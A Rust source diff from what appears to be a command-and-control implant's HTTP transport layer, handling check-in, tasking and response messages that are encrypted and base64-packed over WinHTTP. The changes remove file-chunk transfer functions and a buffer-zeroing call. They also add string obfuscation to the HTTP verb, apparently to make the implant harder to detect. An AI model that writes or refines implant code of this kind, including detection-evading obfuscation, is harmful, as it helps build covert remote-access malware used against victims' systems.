@@ -17,7 +17,7 @@ use crate::profiles::crypto::{CryptoContext, MAX_PLAINTEXT_LEN};
 pub use crate::profiles::crypto::{MAX_B64_LEN, MAX_RAW_LEN};
 #[allow(deprecated)]
 use crate::protocol::{
-    CheckinMessage, FileChunkPayload, GetTaskingMessage, PostResponseMessage,
+    CheckinMessage, GetTaskingMessage, PostResponseMessage,
     ServerCheckinResponse, ServerTaskingResponse, ServerTaskingResponseRef,
 };
 use obfstr::obfstr;
@@ -91,7 +91,6 @@ impl<'a> HttpProfile<'a> {
 
         let res = self.pack_bytes(&json_buf[..json_len], raw_buf, out_b64);
         zeroize_slice(&mut json_buf[..json_len]);
-        zeroize_slice(raw_buf);
         res
     }
 
@@ -167,7 +166,7 @@ impl<'a> HttpProfile<'a> {
     /// 解析服务端下发的心跳响应指令报文 (自持有结构体)
     #[inline]
     #[allow(deprecated)]
-    #[deprecated(note = "建议优先使用零堆分配纯栈式 parse_tasking_response")]
+    #[deprecated]
     pub fn parse_tasking_response_owned(
         &self,
         payload_b64: &[u8],
@@ -189,29 +188,6 @@ impl<'a> HttpProfile<'a> {
         out_b64: &mut [u8],
     ) -> Result<usize, HttpError> {
         self.pack_message(response_msg, raw_buf, out_b64)
-    }
-
-    /// 构建大文件分片传输请求 Base64 报文 (零堆分配)
-    #[inline(never)]
-    pub fn build_file_chunk_payload(
-        &self,
-        chunk: &FileChunkPayload<'_>,
-        raw_buf: &mut [u8],
-        out_b64: &mut [u8],
-    ) -> Result<usize, HttpError> {
-        self.pack_message(chunk, raw_buf, out_b64)
-    }
-
-    /// 解析服务端下发的大文件分片报文 (Download 切片解包)
-    #[inline(never)]
-    pub fn parse_file_chunk_response<'de>(
-        &self,
-        payload_b64: &[u8],
-        raw_buf: &'de mut [u8],
-    ) -> Result<FileChunkPayload<'de>, HttpError> {
-        let chunk: FileChunkPayload<'de> = self.unpack_message(payload_b64, raw_buf)?;
-        chunk.validate().map_err(|_| HttpError::ServerResponseError)?;
-        Ok(chunk)
     }
 
     /// 创建 Windows 原生 WinHTTP Keep-Alive 传输调度器
@@ -401,7 +377,7 @@ pub mod winhttp {
             let mut uri_w = [0u16; 256];
             let mut verb_w = [0u16; 16];
             encode_utf16(uri, &mut uri_w)?;
-            encode_utf16("POST", &mut verb_w)?;
+            encode_utf16(obfstr!("POST"), &mut verb_w)?;
 
             let flags = if self.is_https { WINHTTP_FLAG_SECURE } else { 0 };
 
